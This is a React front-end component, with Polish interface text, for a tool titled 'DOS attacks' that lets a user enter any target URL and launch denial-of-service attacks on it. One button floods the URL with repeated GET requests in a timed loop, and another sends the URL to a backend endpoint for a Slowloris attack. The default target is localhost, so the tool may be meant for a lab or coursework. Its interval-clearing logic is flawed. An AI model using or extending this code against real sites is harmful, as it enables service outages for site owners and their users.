import React, { useState } from 'react'
import { ThemeProvider } from '@mui/material'
import { createTheme } from '@mui/material/styles'
import { TextField, Button } from '@mui/material'
import axios from 'axios'
import { BACKEND_URL } from '../../utils/config'
import {
  FormContainer,
  StyledContainer,
  SectionTitle,
  PageTitle,
  InputWrapper,
  GreenLabel
} from './DDOS.styles'

let iterationValue = 0

const DDOS = (props) => {
  const [delay, setDelay] = useState(0)
  const [quantity, setQuantity] = useState(0)
  const [pageUrl, setPageUrl] = useState('http://localhost:8080')
  const [isError, setIsError] = useState(0)
  const [dos, setDos] = useState(null)
  const theme = createTheme({
    palette: {
      mode: 'light',
    },
  })

  /**
   * Iteracyjne wywoływanie żądania zasobu
   */
  const axiosFux = () => {
    for (let i = 0; i < quantity; i++) {
      axios
        .get(pageUrl)
        .then((reponse) => {
          console.log(reponse)
        })
        .catch((err) => {})
    }
    iterationValue++
  }

  /**
   * Po skończeniu wszystkich iteracji ataku następuje czyszczenie interwału czasowego i reset.
   */
  const dosSite = () => {
    setInterval(axiosFux, delay)
    if (iterationValue > 5) {
      clearInterval()
      setDos('Dos attack done')
    }
  }

  /**
   * Funkcja atakująca sposobem slowLoris
   * @returns {Promise<void>} - zwraca pusty promise serwera.
   */
  const slowLoris = async () => {
    await axios.post(`${BACKEND_URL}/dos?url=${pageUrl}`)
  }

  return (
    <ThemeProvider theme={theme}>
      <StyledContainer>
        <FormContainer>
          <PageTitle>DOS attacks</PageTitle>
          <SectionTitle>Zaatakuj stronę atakiem Odmowy dostępu</SectionTitle>
          <span>
            Podstawowe API jest ustawione automatycznie, jesli chcesz wybrać
            inne api wpisz je poniżej
          </span>
          <InputWrapper>
            <TextField
              fullWidth
              label="Podaj API Url strony do ataku"
              value={pageUrl}
              onChange={(e) => setPageUrl(e.target.value)}
            />
          </InputWrapper>
          <InputWrapper>
            <TextField
              fullWidth
              label="Podaj ilość ataków w jednej iteracji"
              value={quantity}
              onChange={(e) => setQuantity(e.target.value)}
            />
          </InputWrapper>
          <InputWrapper>
            <TextField
              fullWidth
              label="Podaj czas ponowienia iteracji"
              value={delay}
              onChange={(e) => setDelay(e.target.value)}
            />
          </InputWrapper>
          <InputWrapper>
            <Button
              size={'large'}
              variant={'contained'}
              onClick={() => dosSite()}
            >
              Przeprowadź attack Dos
            </Button>
          </InputWrapper>
        </FormContainer>
      </StyledContainer>
      <StyledContainer>
        <FormContainer>
          <SectionTitle>Zatakuj stronę atakiem Odmowy dostępu</SectionTitle>
          <span>
            Podstawowe API jest ustawione automatycznie, jesli chcesz wybrać
            inne api wpisz je poniżej
          </span>
          <InputWrapper>
            <TextField
              fullWidth
              label="Podaj API Url strony do ataku"
              value={pageUrl}
              onChange={(e) => setPageUrl(e.target.value)}
            />
          </InputWrapper>
          <InputWrapper>
            <Button
              size={'large'}
              variant={'contained'}
              onClick={() => slowLoris()}
            >
              Przeprowadź attack slow loris
            </Button>
          </InputWrapper>
          {dos && (
            <GreenLabel>{dos}</GreenLabel>
        )}
        </FormContainer>
      </StyledContainer>
    </ThemeProvider>
  )
}

export default DDOS
